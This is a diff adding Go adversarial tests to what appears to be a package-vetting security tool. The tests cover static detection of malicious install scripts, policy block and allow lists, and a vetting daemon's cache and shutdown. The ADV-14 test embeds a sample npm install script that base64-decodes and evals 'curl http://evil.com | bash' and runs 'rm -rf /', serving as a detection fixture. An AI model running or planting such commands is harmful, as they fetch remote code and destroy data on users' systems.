@@ -2,8 +2,11 @@ package adversarial
 
 import (
 	"context"
+	"fmt"
 	"net/http"
 	"net/http/httptest"
+	"os"
+	"path/filepath"
 	"strings"
 	"sync/atomic"
 	"testing"
@@ -12,10 +15,14 @@ import (
 	"golang.org/x/time/rate"
 
 	"bonjoski/argus/internal/cache"
+	"bonjoski/argus/internal/daemon"
 	"bonjoski/argus/internal/heuristics"
+	"bonjoski/argus/internal/inspector"
 	"bonjoski/argus/internal/lockfile"
 	"bonjoski/argus/internal/model"
+	"bonjoski/argus/internal/policy"
 	"bonjoski/argus/internal/registry"
+	"bonjoski/argus/internal/service"
 	"bonjoski/argus/internal/shim"
 	"bonjoski/argus/internal/vcs"
 )
@@ -568,5 +575,162 @@ func TestADV10_TransitiveLockfileInspection(t *testing.T) {
 	report := evaluator.Evaluate(prov)
 	if report.TotalScore < 30 {
 		t.Errorf("ADV-10 Failed: expected risk score ≥30 for hallucinated transitive dep, got %d", report.TotalScore)
+	}
+}
+
+// ADV-14: Static AST Pre-Flight Payload Inspection
+func TestADV14_StaticASTPreFlightPayloadInspection(t *testing.T) {
+	maliciousScript := `
+const { execSync } = require('child_process');
+const b64 = "Y3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNo";
+eval(Buffer.from(b64, 'base64').toString());
+execSync('rm -rf /');
+`
+	findings := inspector.InspectScriptContent(maliciousScript, "install.js")
+	if len(findings) < 2 {
+		t.Fatalf("ADV-14 Failed: expected at least 2 AST danger findings, got %d", len(findings))
+	}
+
+	prov := &model.PackageProvenance{
+		Name:               "malicious-payload-pkg",
+		Ecosystem:          model.EcosystemNPM,
+		HasInstallScripts:  true,
+		HasSuspiciousAST:   true,
+		SuspiciousFindings: []string{"install.js:3: [OBFUSCATION_EVAL] eval", "install.js:4: [PROCESS_EXECUTION] execSync"},
+	}
+
+	evaluator := heuristics.DefaultEngine()
+	report := evaluator.Evaluate(prov)
+
+	var hr10Triggered bool
+	for _, p := range report.Penalties {
+		if p.RuleID == "HR-10" && p.Triggered {
+			hr10Triggered = true
+			break
+		}
+	}
+
+	if !hr10Triggered {
+		t.Fatalf("ADV-14 Failed: HR-10 (Suspicious Static AST) did not trigger")
+	}
+}
+
+// ADV-15: Enterprise Policy Enforcement
+func TestADV15_EnterprisePolicyEnforcement(t *testing.T) {
+	pol := &policy.Policy{
+		Version:   1,
+		Threshold: 50,
+		Allowlist: policy.AllowlistConfig{
+			Packages: []string{"@mycorp/*"},
+		},
+		Blocklist: policy.BlocklistConfig{
+			Packages: []string{"known-malicious-pkg"},
+		},
+	}
+
+	// 1. Blocklist must hard-block immediately
+	if blocked, _ := pol.MatchBlocklist("known-malicious-pkg", ""); !blocked {
+		t.Fatalf("ADV-15 Failed: known-malicious-pkg was not blocked by policy")
+	}
+
+	// 2. Allowlist must match internal corporate packages
+	if allowed, _ := pol.MatchAllowlist("@mycorp/billing-sdk", ""); !allowed {
+		t.Fatalf("ADV-15 Failed: @mycorp/billing-sdk was not exempt under allowlist")
+	}
+}
+
+// ADV-16: High-Speed IPC Daemon Pre-Flight Interception & Failover
+func TestADV16_HighSpeedIPCDaemonPreFlightInterceptionAndFailover(t *testing.T) {
+	sockPath := filepath.Join(os.TempDir(), fmt.Sprintf("adv16_%d.sock", time.Now().UnixNano()))
+	pidPath := filepath.Join(os.TempDir(), fmt.Sprintf("adv16_%d.pid", time.Now().UnixNano()))
+	dbPath := filepath.Join(t.TempDir(), "adv_cache.db")
+	defer os.Remove(sockPath)
+	defer os.Remove(pidPath)
+
+	store, err := cache.NewSQLiteStore(dbPath)
+	if err != nil {
+		t.Fatalf("ADV-16 Failed to create sqlite store: %v", err)
+	}
+	defer store.Close()
+
+	npmSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = w.Write([]byte(`{
+			"name": "fast-ipc-pkg",
+			"dist-tags": {"latest": "1.0.0"},
+			"time": {
+				"created": "2024-01-01T00:00:00Z",
+				"modified": "2024-06-01T00:00:00Z",
+				"1.0.0": "2024-06-01T00:00:00Z"
+			},
+			"versions": {
+				"1.0.0": {
+					"name": "fast-ipc-pkg",
+					"version": "1.0.0"
+				}
+			}
+		}`))
+	}))
+	defer npmSrv.Close()
+
+	adapter := registry.NewNPMAdapter(nil)
+	adapter.SetRegistryURL(npmSrv.URL)
+	evaluator := heuristics.DefaultEngine()
+	vetService := service.NewVettingService(store, []registry.Adapter{adapter}, nil, evaluator, 24*time.Hour)
+
+	server := daemon.NewServer(sockPath, pidPath, vetService)
+	serverCtx, serverCancel := context.WithCancel(context.Background())
+	defer serverCancel()
+
+	go func() {
+		_ = server.Start(serverCtx)
+	}()
+
+	client := daemon.NewClient(sockPath).WithTimeout(1 * time.Second)
+
+	// 1. Verify Daemon becomes ready
+	deadline := time.Now().Add(2 * time.Second)
+	ready := false
+	for time.Now().Before(deadline) {
+		time.Sleep(20 * time.Millisecond)
+		if client.Ping(context.Background()) == nil {
+			ready = true
+			break
+		}
+	}
+	if !ready {
+		t.Fatalf("ADV-16 Failed: daemon did not start listening")
+	}
+
+	// 2. Initial Vetting (Cache Miss)
+	report1, err := client.Vet(context.Background(), model.EcosystemNPM, "fast-ipc-pkg", "1.0.0", false)
+	if err != nil {
+		t.Fatalf("ADV-16 Failed initial vetting: %v", err)
+	}
+	if report1.Package != "fast-ipc-pkg" {
+		t.Errorf("expected package fast-ipc-pkg, got %s", report1.Package)
+	}
+
+	// 3. Second Vetting (Hot in-memory IPC Cache Hit - Sub-millisecond budget)
+	start := time.Now()
+	report2, err := client.Vet(context.Background(), model.EcosystemNPM, "fast-ipc-pkg", "1.0.0", false)
+	ipcLatency := time.Since(start)
+
+	if err != nil {
+		t.Fatalf("ADV-16 Failed cached vetting: %v", err)
+	}
+	if !report2.Cached {
+		t.Errorf("ADV-16 Failed: expected cached report on repeat query")
+	}
+	t.Logf("ADV-16 Sub-millisecond IPC Latency: %v", ipcLatency)
+
+	// 4. Graceful Daemon Shutdown and Client Failover Handling
+	serverCancel()
+	_ = server.Close()
+
+	time.Sleep(100 * time.Millisecond)
+	// Daemon socket should be unreachable now
+	if client.Ping(context.Background()) == nil {
+		t.Errorf("ADV-16 Failed: expected ping to fail after daemon shutdown")
 	}
 }
